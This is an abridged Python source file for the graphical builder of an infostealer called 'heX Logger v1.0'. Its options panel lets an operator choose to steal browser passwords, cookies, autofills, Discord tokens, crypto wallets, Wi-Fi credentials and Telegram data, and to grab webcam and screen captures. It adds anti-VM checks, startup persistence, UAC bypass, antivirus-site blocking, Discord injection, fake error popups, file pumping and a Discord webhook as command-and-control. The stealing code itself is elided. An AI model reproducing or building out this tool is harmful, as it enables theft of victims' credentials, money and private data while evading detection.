...
class Utility:
	...
	def CheckConfiguration() -> None:
		...
		if os.path.isfile(configFile):
			...
			updatesCheck = not input("UPDATES? (Y)=Yes (N)=No [Y (default)/N]: ").lower().startswith("n")
			_password = input("PASSWORD? (for .rar archive) (default: %r): " % Settings.Password).strip()
			if _password:
				password = _password
...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (10, 5), columnspan= 5)

		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "red", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 10))
		
		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.pingMeVar)
		self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 10)

		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "AntiVM", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.vmProtectVar)
		self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 10)

		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Startup", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.startupVar)
		self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 10)

		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "MeltStub", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.meltVar)
		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 10)

		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "PumpStub", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 10)

		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureWebcamVar)
		self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 10)

		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.capturePasswordsVar)
		self.capturePasswordsCheckboxControl.grid(row= 2, column= 1, sticky= "w", padx= 10)

		self.captureCookiesCheckboxControl = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureCookiesVar)
		self.captureCookiesCheckboxControl.grid(row= 3, column= 1, sticky= "w", padx= 10)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureHistoryVar)
		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 10)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureAutofillsVar)
		self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 10)

		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Tokens", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 10)

		self.captureGamesCheckboxControl = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureGamesVar)
		self.captureGamesCheckboxControl.grid(row= 2, column= 2, sticky= "w", padx= 10)

		self.captureWalletsCheckboxControl = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureWalletsVar)
		self.captureWalletsCheckboxControl.grid(row= 3, column= 2, sticky= "w", padx= 10)

		self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Wifi Info", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureWifiPasswordsVar)
		self.captureWifiPasswordsCheckboxControl.grid(row= 4, column= 2, sticky= "w", padx= 10)

		self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureSystemInfoVar)
		self.captureSysteminfoCheckboxControl.grid(row= 1, column= 3, sticky= "w", padx= 10)

		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureScreenshotVar)
		self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 10)

		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureTelegramVar)
		self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 10)

		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "CommonFiles", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 10)

		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 10)

		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AVSites", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.blockAvSitesVar)
		self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 10)

		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.discordInjectionVar)
		self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 10)

		self.uacBypassCheckboxControl = ctk.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "red", text_color= "dark grey", text_color_disabled= "grey", variable= self.uacBypassVar)
		self.uacBypassCheckboxControl.grid(row= 4, column= 4, sticky= "w", padx= 10)

		self.C2ModeButtonControl = ctk.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#454545", hover_color= "red", text_color_disabled= "dark grey", command= self.C2ModeButtonControl_Callback)
		self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))

		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#454545", hover_color= "red", text_color_disabled= "dark grey", command= self.bindExeButtonControl_Callback)
		self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))

		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#454545", hover_color= "red", text_color_disabled= "dark grey", command= self.selectIconButtonControl_Callback)
		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))

		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#454545", hover_color= "red", text_color_disabled= "dark grey", command= self.buildModeButtonControl_Callback)
		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))

		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#454545", hover_color= "red", text_color_disabled= "dark grey", command= self.consoleModeButtonControl_Callback)
		self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))

		self.buildButtonControl = ctk.CTkButton(self, text= "build", height= 38, font= self.font, fg_color= "#454545", hover_color= "#1E5128", text_color_disabled= "dark grey", command= self.buildButtonControl_Callback)
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("heX Logger v1.0 | [FILE PUMPER]")
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("heX Logger v1.0 | [FAKE ERROR BUILDER]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.titleLabel = ctk.CTkLabel(self, text= "1  2  3", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "red")
